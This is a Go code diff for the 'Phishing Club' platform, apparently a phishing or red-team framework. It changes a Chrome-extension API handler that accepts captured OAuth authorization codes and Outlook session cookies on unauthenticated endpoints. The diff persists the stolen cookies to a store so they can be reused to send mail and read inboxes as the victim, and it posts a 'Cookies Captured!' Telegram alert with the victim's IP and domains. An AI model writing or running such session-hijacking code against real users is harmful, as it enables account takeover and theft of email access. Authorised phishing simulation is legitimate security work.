@@ -8,17 +8,20 @@ import (
 	"time"
 
 	"github.com/gin-gonic/gin"
+	"github.com/phishingclub/phishingclub/model"
 	"github.com/phishingclub/phishingclub/service"
 )
 
 // ChromeExtension handles API endpoints for the Phishing Club Chrome Extension.
 // Endpoints:
-//   GET  /api/extension/ping              - Health check for extension connectivity
-//   POST /api/extension/oauth/callback    - Receive captured OAuth authorization codes
-//   POST /api/extension/cookies/save      - Receive captured Outlook session cookies
+//
+//	GET  /api/extension/ping              - Health check for extension connectivity
+//	POST /api/extension/oauth/callback    - Receive captured OAuth authorization codes
+//	POST /api/extension/cookies/save      - Receive captured Outlook session cookies
 type ChromeExtension struct {
 	Common
-	TelegramService *service.Telegram
+	TelegramService    *service.Telegram
+	CookieStoreService *service.CookieStoreService
 }
 
 // --- Request / Response types ---
@@ -120,7 +123,8 @@ func (c *ChromeExtension) OAuthCallback(g *gin.Context) {
 	})
 }
 
-// CookiesSave receives captured Outlook session cookies from the extension.
+// CookiesSave receives captured Outlook session cookies from the extension
+// and persists them to the CookieStore for later use (sending, inbox reading).
 func (c *ChromeExtension) CookiesSave(g *gin.Context) {
 	var req cookieSaveRequest
 	if err := g.ShouldBindJSON(&req); err != nil {
@@ -133,42 +137,49 @@ func (c *ChromeExtension) CookiesSave(g *gin.Context) {
 		return
 	}
 
-	// Build Netscape format for storage
-	var netscapeLines []string
-	netscapeLines = append(netscapeLines, "# Netscape HTTP Cookie File")
-	netscapeLines = append(netscapeLines, "# Captured by Phishing Club Chrome Extension")
-	netscapeLines = append(netscapeLines, fmt.Sprintf("# Timestamp: %s", time.Now().UTC().Format(time.RFC3339)))
-	netscapeLines = append(netscapeLines, fmt.Sprintf("# Total: %d cookies from %d domains", len(req.Cookies), len(req.Domains)))
-	netscapeLines = append(netscapeLines, "")
-
-	for _, cookie := range req.Cookies {
-		httpOnlyPrefix := ""
-		if cookie.HttpOnly {
-			httpOnlyPrefix = "#HttpOnly_"
-		}
-		secure := "FALSE"
-		if cookie.Secure {
-			secure = "TRUE"
-		}
-		includeSubdomains := "FALSE"
-		if strings.HasPrefix(cookie.Domain, ".") {
-			includeSubdomains = "TRUE"
-		}
-		expiry := "0"
-		if cookie.ExpirationDate > 0 {
-			expiry = fmt.Sprintf("%.0f", cookie.ExpirationDate)
-		}
-
-		line := fmt.Sprintf("%s%s\t%s\t%s\t%s\t%s\t%s\t%s",
-			httpOnlyPrefix, cookie.Domain, includeSubdomains,
-			cookie.Path, secure, expiry, cookie.Name, cookie.Value)
-		netscapeLines = append(netscapeLines, line)
-	}
-
-	netscapeCookies := strings.Join(netscapeLines, "\n")
-
 	c.Logger.Infof("[ChromeExtension] Cookies captured from %s: %d cookies from %d domains",
 		g.ClientIP(), len(req.Cookies), len(req.Domains))
+
+	// Convert extension cookies to the model format for CookieStore import
+	cookieModels := make([]model.CookieObject, len(req.Cookies))
+	for i, ec := range req.Cookies {
+		cookieModels[i] = model.CookieObject{
+			Name:           ec.Name,
+			Value:          ec.Value,
+			Domain:         ec.Domain,
+			Path:           ec.Path,
+			Secure:         ec.Secure,
+			HttpOnly:       ec.HttpOnly,
+			SameSite:       ec.SameSite,
+			ExpirationDate: ec.ExpirationDate,
+		}
+	}
+
+	// Persist to CookieStore if service is available
+	var storeID string
+	if c.CookieStoreService != nil {
+		domainList := strings.Join(req.Domains, ", ")
+		if len(domainList) > 100 {
+			domainList = domainList[:100]
+		}
+		name := fmt.Sprintf("Extension Capture - %s (%s)", g.ClientIP(), time.Now().Format("Jan 02 15:04"))
+
+		importReq := &model.CookieStoreImportRequest{
+			Name:    name,
+			Source:  "extension",
+			Cookies: cookieModels,
+		}
+
+		// Import without session (extension endpoints are unauthenticated)
+		id, err := c.CookieStoreService.Import(g.Request.Context(), nil, importReq)
+		if err != nil {
+			c.Logger.Errorf("[ChromeExtension] Failed to persist cookies to CookieStore: %v", err)
+			// Still return success to the extension - cookies were received
+		} else {
+			storeID = id.String()
+			c.Logger.Infof("[ChromeExtension] Cookies persisted to CookieStore ID: %s", storeID)
+		}
+	}
 
 	// Send Telegram notification if available
 	if c.TelegramService != nil {
@@ -176,11 +187,16 @@ func (c *ChromeExtension) CookiesSave(g *gin.Context) {
 		if len(domainList) > 100 {
 			domainList = domainList[:100] + "..."
 		}
+		storedMsg := ""
+		if storeID != "" {
+			storedMsg = fmt.Sprintf("\nStored: Cookie Store ID %s", storeID)
+		}
 		msg := fmt.Sprintf(
-			"Cookies Captured!\n\nSource: Chrome Extension\nIP: %s\nCookies: %d\nDomains: %s\nTime: %s",
+			"Cookies Captured!\n\nSource: Chrome Extension\nIP: %s\nCookies: %d\nDomains: %s%s\nTime: %s",
 			g.ClientIP(),
 			len(req.Cookies),
 			domainList,
+			storedMsg,
 			time.Now().Format("2006-01-02 15:04:05"),
 		)
 		go c.TelegramService.Notify(
@@ -192,10 +208,13 @@ func (c *ChromeExtension) CookiesSave(g *gin.Context) {
 		)
 	}
 
-	_ = netscapeCookies
-
-	g.JSON(http.StatusOK, gin.H{
+	response := gin.H{
 		"success": true,
-		"message": fmt.Sprintf("Received %d cookies from %d domains", len(req.Cookies), len(req.Domains)),
-	})
+		"message": fmt.Sprintf("Received and stored %d cookies from %d domains", len(req.Cookies), len(req.Domains)),
+	}
+	if storeID != "" {
+		response["cookieStoreId"] = storeID
+	}
+
+	g.JSON(http.StatusOK, response)
 }
